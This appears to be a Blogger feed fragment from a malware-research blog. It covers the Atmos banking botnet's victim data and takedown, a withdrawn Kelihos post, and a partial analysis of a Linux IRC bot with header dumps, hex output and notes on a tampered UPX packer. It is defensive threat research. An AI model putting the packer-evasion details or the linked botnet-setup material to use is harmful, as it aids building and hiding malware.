campaign shown in the above screenshots.\u003Cbr\u003EThere is also recent incident shows that a hacked site was used to serve Atmos botnet panel.  \u003Cp\u003E\u003Ch2\u003ESeveral countries targeted by Atmos\u003C\/h2\u003E \u003Cp\u003EThere is no \"specific country\" to be targeted by Atmos. It practically all depends on the actors objectivity. Since most of actors are  crooks or thiefs, they are mainly aiming our pocket for online money\/card info we do in our PC in anywhere. Atmos provides many scheme for getting those, and to push more scheme of infection to the infected botnet further too, therefore for crime crooks who are familiar in using previous era of crime toolkits like Zeus, Citadel or KINS before, can use Atmos in a snap.   In the field,we saw varied scheme of infection, few are spam campaigns and some are web driven infecion methods. On several Atmos CNC panels, which their information are \"safe\" to be shared (several panels were taken down though), they are showing country basis victims in graphical modes as per data below:  \u003Cp\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-WFGC8tc6NsU\/V1a8R6prbII\/AAAAAAAAVVA\/dAPNTYaGtgkgA39DmcwIYLkKES1DamZQgCLcB\/s3120\/7002.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-WFGC8tc6NsU\/V1a8R6prbII\/AAAAAAAAVVA\/dAPNTYaGtgkgA39DmcwIYLkKES1DamZQgCLcB\/s200\/7002.PNG\u003E \u003C\/a\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-fQ2sA6M61r4\/V1a8RwvNbdI\/AAAAAAAAVU8\/mfb6kWb-wGM_9whxLCZPySytYX7O7mPvwCLcB\/s3120\/7003.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-fQ2sA6M61r4\/V1a8RwvNbdI\/AAAAAAAAVU8\/mfb6kWb-wGM_9whxLCZPySytYX7O7mPvwCLcB\/s200\/7003.PNG\u003E \u003C\/a\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-4AaER-jtupo\/V1a8R5pWfjI\/AAAAAAAAVVE\/ZNHktRu8UaAZlvuW7btKM2ftO_vEImVAgCLcB\/s3120\/7001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-4AaER-jtupo\/V1a8R5pWfjI\/AAAAAAAAVVE\/ZNHktRu8UaAZlvuW7btKM2ftO_vEImVAgCLcB\/s200\/7001.png\u003E \u003C\/a\u003E \u003Cp\u003ESpeaking of countries, there are many character encoding used for handling the PC data saved to be grabbed by Atmos bad actors. This botnet is handling the encoding character very well, i.e. double bytes encoding Chinese(Simplify\/not) or Japanese, were perfectly grabbed and stored in its user's interface:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-UtdSMSBiKD4\/V1gl6t4CAbI\/AAAAAAAAVWc\/GPxI0KxPZyo1gZN8mIfFvUwfKKVHHoznQCLcB\/s3120\/004.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-UtdSMSBiKD4\/V1gl6t4CAbI\/AAAAAAAAVWc\/GPxI0KxPZyo1gZN8mIfFvUwfKKVHHoznQCLcB\/s580\/004.PNG\u003E\u003C\/a\u003E\u003Cbr\u003ESo this botnet toolkit is designed to compromise anyone, anywhere, to perform any desirable method in online data stealing. A pure evil toolkit. \u003Cbr\u003EThere is a minority usage for a specific target\/purpose too, but this info is classified :)  \u003Cp\u003E\u003Cb\u003EHow incident response team recognizing the country victims?\u003C\/b\u003E \u003Cp\u003EIn the Atmos panel, just like Citadel, there is no sorting function for gathering data of bot ID per listed countries, they have only the summary, so the crooks should click ID per bot one by one too I guess for checking details. But it is important to warn victims who got infected by this botnet, and we are doing that too. So, in order to get list of evidence on Atmos infection during \u003Cb\u003E\"securing\" \u003C\/b\u003Etheir panel, don't waste your time, and go to the botlist and grab the textual data listed in that panel. Just grab it all page per page and safe into a select-able text file. To then you can aim any desired country victims as per real cases we handled below. This way you won't spend too much time in that evil environment. \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-iskpTjYXN1Y\/V1g9asjByyI\/AAAAAAAAVXY\/1YsZPWAUmpEPEUSd_nHyNqJj_zXonsMZwCLcB\/s3120\/008.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-iskpTjYXN1Y\/V1g9asjByyI\/AAAAAAAAVXY\/1YsZPWAUmpEPEUSd_nHyNqJj_zXonsMZwCLcB\/s580\/008.PNG\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-XBoE3QUYyBg\/V1g9aof102I\/AAAAAAAAVXU\/bZbhCWQYzDUXM8mnU6Ug6_uf9MJ-ssWuACLcB\/s3120\/009.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-XBoE3QUYyBg\/V1g9aof102I\/AAAAAAAAVXU\/bZbhCWQYzDUXM8mnU6Ug6_uf9MJ-ssWuACLcB\/s580\/009.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EYou can later on divide each IP's network by ISP for them to contact their users for the alert to their customers, or pass the list to your coordinated CERT\/CSIRT.  \u003Cp\u003EOne more thing that IR team should be aware is, the GeoIP indicator used by Atmos just sucks. Atmos used own outdated database to locate infected IP to be showned in the botlist like this one (see the marked one):\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-ikGw58jwPew\/V1qwqTq7r_I\/AAAAAAAAVYA\/lvOViRGV63wiqP_MJUMzATJx79ZN4VzDQCLcB\/s2279\/1001.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-ikGw58jwPew\/V1qwqTq7r_I\/AAAAAAAAVYA\/lvOViRGV63wiqP_MJUMzATJx79ZN4VzDQCLcB\/s580\/1001.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EIt is said the location is in Japan, but actually is in India. So you must re-check the list of IP first before you make any action.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-3ErfE5tMmzA\/V1qx6g81xLI\/AAAAAAAAVYM\/E5feF5zfNNYpsOmwSkVtX_EJDJ5SuJR6gCLcB\/s2296\/1002.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-3ErfE5tMmzA\/V1qx6g81xLI\/AAAAAAAAVYM\/E5feF5zfNNYpsOmwSkVtX_EJDJ5SuJR6gCLcB\/s400\/1002.PNG\u003E\u003C\/a\u003E \u003Cp\u003E\u003Ch2\u003EAtmos setup tutorial \u0026 full package overview\u003C\/h2\u003E \u003Cp\u003EThis video is the latest version, it was said, which is planned to be pushed in the market this month (June 2016), yet apparently it is the \u003Cb\u003Eversion 1.01\u003C\/b\u003E (for sure: it is the current ITW version actually), and an idiotic distributor was sharing its video tutorial :) \u003Cp\u003ESo, would it be the best of interest for security community to see how the setup process of this botnet goes, as per crooks do it? I share this for everyone involved (and specially law enforcement too) to take a notification on many facts can be taken from recent Atmos botnet. See how it is installed, builder's usage, and panel configuration, etc. This video should be \"genuine\" artifact made by crime actor himself, it would be better in presenting than either me or Xylit0l made it. PLEASE use the information exposed for taking down this actor and the further Atmos botnet. DO NOT use this information for the bad purpose! (the most important part of this setup video was cropped for security purpose)\u003Cbr\u003E\u003Ciframe width=\"580\" height=\"326\" src=\"https:\/\/www.youtube.com\/embed\/hHnHroIMhU4?rel=0\" frameborder=\"0\" allowfullscreen\u003E\u003C\/iframe\u003E \u003Cp\u003EIn the below video is snagged from another cyber crook who was trying to promote Atmos (also version 1.01) in late May 2016, he demonstrated the full Atmos package list in his PC that I think will give all of us better idea about how this threat distribute. These two videos are coming from two distributors of Atmos botnet:\u003Cbr\u003E\u003Ciframe width=\"580\" height=\"326\" src=\"https:\/\/www.youtube.com\/embed\/hrfu0nkuzwE?rel=0\" frameborder=\"0\" allowfullscreen\u003E\u003C\/iframe\u003E \u003Cp\u003E\u003Ch2\u003EAtmos \"Tango Down\"\u003C\/h2\u003E \u003Cp\u003EThe main reason of whitehat hackers, IR professionals and malware researchers gather together in MalwareMustDie is to takedown the malware services. This goes the same to the Atmos botnet, with the solid coordination of good folks and friends in incident response chains, WE ALL took chain of efforts in taking them down. Below are some examples:  \u003Cp\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-xzpeuFpCo-g\/V1n0ibpWA0I\/AAAAAAAAVXs\/80yMOSYgQKQrHk5AFslNFO0Z83NzjwFPACLcB\/s3120\/0023_phixr.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-xzpeuFpCo-g\/V1n0ibpWA0I\/AAAAAAAAVXs\/80yMOSYgQKQrHk5AFslNFO0Z83NzjwFPACLcB\/s580\/0023_phixr.png\u003E\u003C\/a\u003E \u003Cp\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-hk49GMMol-s\/V2PUWLkc-lI\/AAAAAAAAVaU\/y5kSMM_EDDk1UMlypzgt6GZTSAF14fTSgCLcB\/s3111\/8001_phixr.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-hk49GMMol-s\/V2PUWLkc-lI\/AAAAAAAAVaU\/y5kSMM_EDDk1UMlypzgt6GZTSAF14fTSgCLcB\/s580\/8001_phixr.png\u003E\u003C\/a\u003E \u003Cbr\u003EMany thanks to friends who involved to this action. Special thank you to Xylit0l.  \u003Cp\u003E\u003Ch2\u003EEpilogue\u003C\/h2\u003E \u003Cp\u003EWe hope the information shared here will help to battle the threat better.  \u003Cp\u003EA small announcement from me:\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-zzAJ9TGC0Xg\/V18ck9rSdZI\/AAAAAAAAVY8\/qC65qXYchZ4nHAiDfhUPwIe_Z0n9UKgogCLcB\/s400\/6001.PNG\u003E\u003Cbr\u003E \u003Cp\u003EI may update or add or delete information, as usual. You know where to reach us. \u003Cbr\u003EBravo Xylit0l for the good work \u0026 thanks for the previous share to all of us!   \u003Cp\u003E\u003Ch2\u003EDon't be that serious :-)\u003C\/h2\u003E \u003Cp\u003EFirstly it was a joke from me to tease this Atmosseller..\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-lKomCrQ9fSg\/V1bQmuqDhlI\/AAAAAAAAVV8\/NuWEM8OICqo1io0Cw0UBG0q96_iIDDATQCLcB\/s3120\/00LULZ.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-lKomCrQ9fSg\/V1bQmuqDhlI\/AAAAAAAAVV8\/NuWEM8OICqo1io0Cw0UBG0q96_iIDDATQCLcB\/s520\/00LULZ.png\u003E\u003C\/a\u003E \u003Cp\u003EWell, he took it very seriously..so I played it along :)\u003Cbr\u003EObviously there's no such new version bragged by some sellers, but there are some cracked versions with the builders that some of them are not working. Well, don't ever trust of what these crooks say.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-U_ZG7jjNZjk\/V2zMcQGgeXI\/AAAAAAAAVbw\/gAAUnrxDm7UH5aEIAe-9wu6hwvOR9WRCwCLcB\/s3120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-U_ZG7jjNZjk\/V2zMcQGgeXI\/AAAAAAAAVbw\/gAAUnrxDm7UH5aEIAe-9wu6hwvOR9WRCwCLcB\/s580\/Capture.PNG\u003E\u003C\/a\u003E \u003Cp\u003E#MalwareMustDie! Analyzed by \u003Ca href=\"https:\/\/twitter.com\/unixfreaxjp\"\u003E@unixfreaxjp\u003C\/a\u003E, all reference: \u003Ca href=\"https:\/\/twitter.com\/Xylit0l\"\u003E@Xylit0l\u003C\/a\u003E\u003Cbr\u003EThis report along with overall blog posts are bound to our legal disclaimer--\u003E[\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/p\/the-rule-to-share-malicious-codes-we.html\"\u003Elink\u003C\/a\u003E]"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/3839139087438505773\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2016\/06\/mmd-0054-2016-atmos-botnet-and-facts.html#comment-form","title":"3 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/3839139087438505773"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/3839139087438505773"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2016\/06\/mmd-0054-2016-atmos-botnet-and-facts.html","title":"MMD-0054-2016 - ATMOS botnet facts you should know"}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"thr$total":{"$t":"3"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-6561341199716294128"},"published":{"$t":"2016-05-08T10:33:00.000-07:00"},"updated":{"$t":"2016-08-28T20:29:38.050-07:00"},"title":{"type":"text","$t":"[Slide|Video] Kelihos \u0026 Peter Severa; the \"All Out\" version"},"content":{"type":"html","$t":"\u003Ci\u003E\u003Cp\u003ETag: Kelihos, Khelios, P2P, FastFlux, Botnet, CNC, C2, Clickfraud, Traffic Redirection, Spambot, DNS Poison, Botnet as Service, Affiliate, Severa, Peter Severa, Petrushakov, Saever, Saushkin\u003C\/i\u003E \u003Cp\u003E\u003Ccenter\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-2zTcC8nEMEo\/VzMJid4K-UI\/AAAAAAAAVLQ\/5smxgvDb0p4FqS53es7A6EYAv783jKMsQCLcB\/s300\/002.png\u003E\u003Cbr\u003E\u003C\/center\u003E \u003Cp\u003EWe \u003Ci\u003Eyanked\u003C\/i\u003E this page off along with the slides \u0026 its video links from public view to support cyber crime investigation to stop the botnet for good. It's a good will from our investigation team and there's no such force of power involved.  \u003Cp\u003EAll of the material and evidence of Kelihos Operation from  MalwareMustDie from 2012 to 2016, were handed over to the United States law enforcement and \u003Cb\u003Ewe are not holding anything back\u003C\/b\u003E.  \u003Cbr\u003EIf you are from other law enforcement agencies and interested to see what was in this page, please directly contact to the mentioned organization accordingly.   \u003Cp\u003EFor the previous viewers, we are terribly sorry for the inconvenience, thank you for all of your great support to this matter.  \u003Cp\u003EMalwareMustDie!"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/6561341199716294128\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2016\/05\/slidevideo-kelihos-peter-severa-all-out.html#comment-form","title":"2 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/6561341199716294128"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/6561341199716294128"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2016\/05\/slidevideo-kelihos-peter-severa-all-out.html","title":"[Slide|Video] Kelihos \u0026 Peter Severa; the \"All Out\" version"}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"media$thumbnail":{"xmlns$media":"/web/20160930230250/http://search.yahoo.com/mrss/","url":"https:\/\/lh3.googleusercontent.com\/-2zTcC8nEMEo\/VzMJid4K-UI\/AAAAAAAAVLQ\/5smxgvDb0p4FqS53es7A6EYAv783jKMsQCLcB\/s72-c\/002.png","height":"72","width":"72"},"thr$total":{"$t":"2"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-7608444692981067758"},"published":{"$t":"2016-04-15T09:50:00.005-07:00"},"updated":{"$t":"2016-05-23T12:06:55.282-07:00"},"title":{"type":"text","$t":"MMD-0053-2016 - A bit about ELF\/STD IRC Bot: x00's CBack aka xxx.pokemon(.)inc"},"content":{"type":"html","$t":"\u003Ccenter\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-sG0fb170iUs\/VxEYGzzNcxI\/AAAAAAAAUxY\/SU9dIJMEWPU6mj_pVYM35AmOLojY9hdOwCLcB\/s400\/4000.PNG\u003E\u003C\/center\u003E \u003Ci\u003E\u003Cp\u003E\u003Cfont color=yellow\u003ELatest UPDATE incident of this threat is--\u003E[\u003Ca href=\"http:\/\/imgur.com\/a\/4VQ75\"\u003Elink\u003C\/a\u003E]\u003C\/font\u003E\u003C\/i\u003E\u003Cp\u003E\u003Ch2\u003EBackground\u003C\/h2\u003E\u003Cp\u003EI received the report of the host in Google cloud network is serving ELF malware:\u003Cbr\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-FVe0PrsZS7M\/VxDTLG5dOZI\/AAAAAAAAUuQ\/SY6yCKe-o0Q5Vd75sQxi3BN2EbD1bH4SQCLcB\/s2580\/3001.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-FVe0PrsZS7M\/VxDTLG5dOZI\/AAAAAAAAUuQ\/SY6yCKe-o0Q5Vd75sQxi3BN2EbD1bH4SQCLcB\/s580\/3001.PNG\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E{\u003Cbr \/\u003E  \"ip\": \"130.211.127.186\",\u003Cbr \/\u003E  \"hostname\": \"186.127.211.130.bc.googleusercontent.com\",\u003Cbr \/\u003E  \"prefix\": \"130.211.0.0\/16\",\u003Cbr \/\u003E  \"org\": \"AS15169 Google Inc.\",\u003Cbr \/\u003E  \"city\": \"Mountain View\",\u003Cbr \/\u003E  \"region\": \"California\",\u003Cbr \/\u003E  \"country\": \"USA\",\u003Cbr \/\u003E  \"loc\": \"37.4192,-122.0574\",\u003Cbr \/\u003E  \"postal\": \"94043\"\u003Cbr \/\u003E}\u003Cbr \/\u003E\u003C\/pre\u003ESo I downloaded them all \u003Ci\u003Ein secure way\u003C\/i\u003E like as per follows: \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-rm6kap7h1ys\/VxDUjgHG2ZI\/AAAAAAAAUuc\/RsfWDVJOaFcgsODCqLABEwaa3khvCkAyACLcB\/s2120\/3002.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-rm6kap7h1ys\/VxDUjgHG2ZI\/AAAAAAAAUuc\/RsfWDVJOaFcgsODCqLABEwaa3khvCkAyACLcB\/s580\/3002.PNG\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ci\u003E*) p.s.: I never use same request pattern during my encounter to any malware servers\u003C\/i\u003E\u003Cp\u003EELF botnet infecting routers is a bad thing, but abusing Google cloud is another bad thing. Not to mention the utilization of much innocent hacked servers as CNC \u0026 the many mis-use of the anime features for badness.\u003Cbr\u003E  After receiving several reports on incidents and requests on the topic I decided to write this post as awareness and indicator reference, along with some \u003Cb\u003ESLAPS! \u003C\/b\u003Eto the malware coder and actors behind this threat, which are linked to the previous blog post in--\u003E\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2016\/02\/mmd-0052-2016-skidddos-elf-distribution.html\"\u003Ehere\u003C\/a\u003E.  \u003Cp\u003E\u003Ch2\u003EThe first slap: First look\u003C\/h2\u003E\u003Cp\u003EThese are ELF malware of this post, let's pick one and see how it looks in the first sight:  \u003Cp\u003EThe binary structure and view:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-Gx5CB6XmtfQ\/VxDWwYtfgFI\/AAAAAAAAUuo\/5xppZcKSgH0-wrt_926BAf-LG_ZghbQ9gCLcB\/s3220\/3004.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-Gx5CB6XmtfQ\/VxDWwYtfgFI\/AAAAAAAAUuo\/5xppZcKSgH0-wrt_926BAf-LG_ZghbQ9gCLcB\/s580\/3004.png\u003E\u003C\/a\u003E \u003Cp\u003EThe readelf summarizes its header is as follows, \u003Cbr\u003E\u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003EELF Header:\u003Cbr \/\u003E  Magic:   7f 45 4c 46 01 01 01 03 00 00 00 00 00 00 00 00\u003Cbr \/\u003E  Class:                             ELF32\u003Cbr \/\u003E  Data:                              2's complement, little endian\u003Cbr \/\u003E  Version:                           1 (current)\u003Cbr \/\u003E  OS\/ABI:                            UNIX - Linux\u003Cbr \/\u003E  ABI Version:                       0\u003Cbr \/\u003E  Type:                              EXEC (Executable file)\u003Cbr \/\u003E  Machine:                           Intel 80386\u003Cbr \/\u003E  Version:                           0x1\u003Cbr \/\u003E  Entry point address:               0xc086b8\u003Cbr \/\u003E  Start of program headers:          52 (bytes into file)\u003Cbr \/\u003E  Start of section headers:          0 (bytes into file)\u003Cbr \/\u003E  Flags:                             0x0\u003Cbr \/\u003E  Size of this header:               52 (bytes)\u003Cbr \/\u003E  Size of program headers:           32 (bytes)\u003Cbr \/\u003E' Number of program headers:         2 '\u003Cbr \/\u003E  Size of section headers:           40 (bytes)\u003Cbr \/\u003E  Number of section headers:         0\u003Cbr \/\u003E  Section header string table index: 0\u003Cbr \/\u003E\u003Cbr \/\u003E'Program Headers:'\u003Cbr \/\u003E  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align\u003Cbr \/\u003E' LOAD           0x000000 0x00c01000 0x00c01000 0x08828 0x08828 R E 0x1000   '\u003Cbr \/\u003E' LOAD           0x000448 0x0805f448 0x0805f448 0x00000 0x00000 RW  0x1000   '\u003Cbr \/\u003E\u003Cbr \/\u003EThere are no sections in this file.\u003Cbr \/\u003EThere are no sections in this file.\u003Cbr \/\u003EThere is no dynamic section in this file.\u003Cbr \/\u003EThere are no relocations in this file.\u003Cbr \/\u003EThere are no unwind sections in this file.\u003Cbr \/\u003ENo version information found in this file.\u003Cbr \/\u003E\u003C\/pre\u003EI marked places where one should pay attention with, to see the headers in much better mode can be done in objdump: \u003Cpre class=\"brush: asm\"\u003Epty:     file format elf32-i386\u003Cbr \/\u003Epty\u003Cbr \/\u003Earchitecture: i386, flags 0x00000102:\u003Cbr \/\u003EEXEC_P, D_PAGED\u003Cbr \/\u003Estart address 0x00c086b8\u003Cbr \/\u003E\u003Cbr \/\u003EProgram Header:\u003Cbr \/\u003E'   LOAD off    0x00000000 vaddr 0x00c01000 paddr 0x00c01000 align 2**12'\u003Cbr \/\u003E         filesz 0x00008828 memsz 0x00008828 flags r-x\u003Cbr \/\u003E'   LOAD off    0x00000448 vaddr 0x0805f448 paddr 0x0805f448 align 2**12'\u003Cbr \/\u003E         filesz 0x00000000 memsz 0x00000000 flags rw- \u003Cbr \/\u003E\u003Cbr \/\u003ESections:\u003Cbr \/\u003EIdx Name          Size      VMA       LMA       File off  Algn\u003Cbr \/\u003ESYMBOL TABLE:\u003Cbr \/\u003Eno symbols\u003Cbr \/\u003E\u003C\/pre\u003EWith a good text analyzer you'll find first indicator of this threat, which is the sentence quoted from \u003Ci\u003Ebakemonogatari \u003C\/i\u003Eanime \u003Ci\u003Eiinchou character\u003C\/i\u003E which was printed hard coded in this ELF in \u003Ci\u003Eroumaji \u003C\/i\u003E(read: ASCII) Japanese as per below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-NcaMy9JKuu4\/VxDehdbpvTI\/AAAAAAAAUu4\/oTivTFXUnNgU2F2pr7fVRtSE1rLBxYawgCLcB\/s2103\/3005.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-NcaMy9JKuu4\/VxDehdbpvTI\/AAAAAAAAUu4\/oTivTFXUnNgU2F2pr7fVRtSE1rLBxYawgCLcB\/s455\/3005.png\u003E\u003C\/a\u003E\u003Cbr\u003EAnd accordingly I strongly doubt the coder know the \"true\" meaning of these sentence :))   \u003Cp\u003E\u003Ch2\u003EThe second slap: Recognizing the packer\u003C\/h2\u003E\u003Cp\u003EFirst, this is a packed binary, by UPX, this is the easy way to recognize it since so many trick are used for camouflage the this good known packer. See again the Program Header part; \u003Cpre class=\"brush: asm\"\u003E    LOAD off    0x00000000 vaddr 0x00c01000 paddr 0x00c01000 align 2**12\u003Cbr \/\u003E         filesz 0x00008840 memsz 0x00008840 flags r-x\u003Cbr \/\u003E    LOAD off    0x000003a8 vaddr 0x0805f3a8 paddr 0x0805f3a8 align 2**12\u003Cbr \/\u003E         filesz 0x00000000 memsz 0x00000000 flags rw-\u003Cbr \/\u003E\u003C\/pre\u003Ethe 0x00c01000 will store copy of the packed ELF header, and 0x0805f3a8 is start address of stubs contains the data packed. Some PoC: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E\u003E x 0xaa@\"0x000\";x 0xaa@\"0x00c01000\"\u003Cbr \/\u003E- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\u003Cbr \/\u003E0x00000000  7f45 4c46 0101 0103 0000 0000 0000 0000  .ELF............\u003Cbr \/\u003E0x00000010  0200 0300 0100 0000 d086 c000 3400 0000  ............4...\u003Cbr \/\u003E0x00000020  0000 0000 0000 0000 3400 2000 0200 2800  ........4. ...(.\u003Cbr \/\u003E0x00000030  0000 0000 0100 0000 0000 0000 0010 c000  ................\u003Cbr \/\u003E0x00000040  0010 c000 4088 0000 4088 0000 0500 0000  ....@...@.......\u003Cbr \/\u003E0x00000050  0010 0000 0100 0000 a803 0000 a8f3 0508  ................\u003Cbr \/\u003E0x00000060  a8f3 0508 0000 0000 0000 0000 0600 0000  ................\u003Cbr \/\u003E0x00000070  0010 0000 2efa 01da 0a00 0000 7811 0d0c  ............x...\u003Cbr \/\u003E0x00000080  0000 0000 139a 0100 139a 0100 9400 0000  ................\u003Cbr \/\u003E0x00000090  5400 0000 0e00 0000 1803 003f 91d0 6b8f  T..........?..k.\u003Cbr \/\u003E0x000000a0  492f fa6a e407 9a89 5c84                 I\/.j....\\.\u003Cbr \/\u003E- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\u003Cbr \/\u003E0x00c01000  7f45 4c46 0101 0103 0000 0000 0000 0000  .ELF............\u003Cbr \/\u003E0x00c01010  0200 0300 0100 0000 d086 c000 3400 0000  ............4...\u003Cbr \/\u003E0x00c01020  0000 0000 0000 0000 3400 2000 0200 2800  ........4. ...(.\u003Cbr \/\u003E0x00c01030  0000 0000 0100 0000 0000 0000 0010 c000  ................\u003Cbr \/\u003E0x00c01040  0010 c000 4088 0000 4088 0000 0500 0000  ....@...@.......\u003Cbr \/\u003E0x00c01050  0010 0000 0100 0000 a803 0000 a8f3 0508  ................\u003Cbr \/\u003E0x00c01060  a8f3 0508 0000 0000 0000 0000 0600 0000  ................\u003Cbr \/\u003E0x00c01070  0010 0000 2efa 01da 0a00 0000 7811 0d0c  ............x...\u003Cbr \/\u003E0x00c01080  0000 0000 139a 0100 139a 0100 9400 0000  ................\u003Cbr \/\u003E0x00c01090  5400 0000 0e00 0000 1803 003f 91d0 6b8f  T..........?..k.\u003Cbr \/\u003E0x00c010a0  492f fa6a e407 9a89 5c84                 I\/.j....\\.\u003Cbr \/\u003E\u003E[0x00c086d0]\u003E x@\"0x0805f3a8\"\u003Cbr \/\u003E- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\u003Cbr \/\u003E0x0805f3a8  6507 7c7e 31e5 29e8 ad2e 4cd4 b883 c761  e.|~1.)...L....a\u003Cbr \/\u003E0x0805f3b8  709c 6090 b540 bb85 7ede a550 cce0 b146  p.`..@..~..P...F\u003Cbr \/\u003E0x0805f3c8  8211 fa50 5e82 d55e 2227 b678 e121 fa00  ...P^..^\"'.x.!..\u003Cbr \/\u003E0x0805f3d8  f595 a5e7 5654 b02b 6c2e 4daa de34 103f  ....VT.+l.M..4.?\u003Cbr \/\u003E0x0805f3e8  d119 ab5b 7c26 20e7 dd69 9df4 822b a118  ...[|\u0026 ..i...+..\u003Cbr \/\u003E0x0805f3f8  7277 8b6c fd4d ac58 49ea f06d 6611 e239  rw.l.M.XI..mf..9\u003Cbr \/\u003E\u003C\/pre\u003Ebut if you extract it it will show this error: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E        File size         Ratio      Format      Name\u003Cbr \/\u003E   --------------------   ------   -----------   -----------\u003Cbr \/\u003E'upx: pty: NotPackedException: not packed by UPX'\u003C\/pre\u003EThe reason is simply after the UPX packed the real binary a modification was made so UPX can not find the starting upx point nor header (see figure below) to start doing the unpacking, \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-f-vcv5KwRcE\/VxDtQq4id6I\/AAAAAAAAUvI\/AGnxgHMOy_QxRagShBeIliBNVTGgDz_7ACLcB\/s2288\/3006.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-f-vcv5KwRcE\/VxDtQq4id6I\/AAAAAAAAUvI\/AGnxgHMOy_QxRagShBeIliBNVTGgDz_7ACLcB\/s380\/3006.PNG\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ci\u003E(↑pic: normal UPX seeks for packer indicator)\u003C\/i\u003E\u003Cp\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-cHiKfVisZsw\/VxEtQFekEFI\/AAAAAAAAUxo\/-NzYHmW42XseaVv2d4DtylT2LqCmnuk0QCLcB\/s2120\/4001.png\"\u003E\u003Cimg 